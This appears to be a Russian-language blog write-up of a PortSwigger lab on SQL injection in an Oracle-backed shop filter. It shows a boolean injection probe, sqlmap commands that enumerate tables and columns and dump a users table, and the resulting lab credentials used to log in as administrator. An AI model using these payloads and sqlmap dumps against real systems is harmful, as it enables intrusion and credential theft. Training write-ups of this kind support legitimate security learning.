---
title: "SQL injection attack, listing the database contents on Oracle"
date: 2025-06-06
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle"
classes: wide
---

Лаба узвима к **SQL injection**. Для решения нужно получить учетные данные администратора и залогиниться от его имени.

```
https://0a57003c0432926b813a7a8500cf0090.web-security-academy.net/
```

## Solution

Вижу уже знакомый мне фильтр категорий:

```
https://0a57003c0432926b813a7a8500cf0090.web-security-academy.net/filter?category=Gifts
```

В параметре `GET`-запроса передается имя категории. Проверю, уязвим ли он для `SQLi`:

```
Gifts' and 1=0-- -ok
```

<details>
<summary>Пояснение</summary>
  
<strong>'</strong> закрывает текущую строку SQL, <strong>and 1=0</strong> делает условие заведомо ложным, <strong>-- -</strong> — комментарий, обрезает остальной SQL-код после вставки.

</details>  

Угадал. Мне выдало пустую страницу:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_attack_listing_the_database_contents_on_Oracle/1.png){: height="200" .align-center}


Для решения буду использовать инструмент `sqlmap`. С помощью него получу список всех таблиц из БД:

```bash
sqlmap -u "https://0a57003c0432926b813a7a8500cf0090.web-security-academy.net/filter?category=Gifts" -p category --batch --tables 
```

<details>
<summary>Пояснение</summary> 
  
<strong>sqlmap</strong> — это инструмент для автоматического обнаружения и эксплуатации уязвимостей `SQL`-инъекций. Он позволяет проверять параметры URL, формы, cookies и извлекать данные из базы данных, не зная заранее её структуру.

</details> 

```
Database: PETER
[2 tables]
+--------------------------------+
| PRODUCTS                       |
| USERS_KSJEGE                   |
+--------------------------------+
```


Полученная БД выглядит интересно. Попробую вытащить из нее данные:

```bash
sqlmap -u "https://0a570
03c0432926b813a7a8500cf0090.web-security-academy.net/filter?category=Gifts" -p category --batch -D PETER --columns
```

Вывод:

```bash
Database: PETER
Table: PRODUCTS
[8 columns]
+-------------+----------+
| Column      | Type     |
+-------------+----------+
| DESCRIPTION | VARCHAR2 |
| NAME        | VARCHAR2 |
| CATEGORY    | VARCHAR2 |
| ID          | NUMBER   |
| IMAGE       | VARCHAR2 |
| PRICE       | NUMBER   |
| RATING      | NUMBER   |
| RELEASED    | NUMBER   |
+-------------+----------+

Database: PETER
Table: USERS_KSJEGE
[3 columns]
+-----------------+----------+
| Column          | Type     |
+-----------------+----------+
| EMAIL           | VARCHAR2 |
| PASSWORD_ZOCUVS | VARCHAR2 |
| USERNAME_YYRPEJ | VARCHAR2 |
+-----------------+----------+
```


Теперь я хочу сдампить таблицу `USERS_KSJEGE`:

```bash
sqlmap -u "https://0a57003c0432926b813a7a8500cf0090.web-security-academy.net/filter?category=Gifts" -p category --batch -D PETER -T USERS_KSJEGE --dump
```

<details>
<summary>Пояснение</summary> 
  
Сдампить (от англ. <strong>dump</strong>) в контексте <strong>SQLi</strong> — значит выгрузить содержимое базы данных: таблицы, строки, пароли, логины и т.д.

</details> 


Результат:

```bash
Database: PETER
Table: USERS_KSJEGE
[3 entries]
+-------+----------------------+-----------------+
| EMAIL | PASSWORD_ZOCUVS      | USERNAME_YYRPEJ |
+-------+----------------------+-----------------+
| NULL  | tpidtpk8p30yf31z390j | administrator   |
| NULL  | tubu1f93ucymkzey93mc | wiener          |
| NULL  | 8ew1awl6nyizysjnernx | carlos          |
+-------+----------------------+-----------------+
```


Использую креды для входа:


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_attack_listing_the_database_contents_on_Oracle/2.png){: height="200" .align-center}


Лаба пройдена:3 ☕ 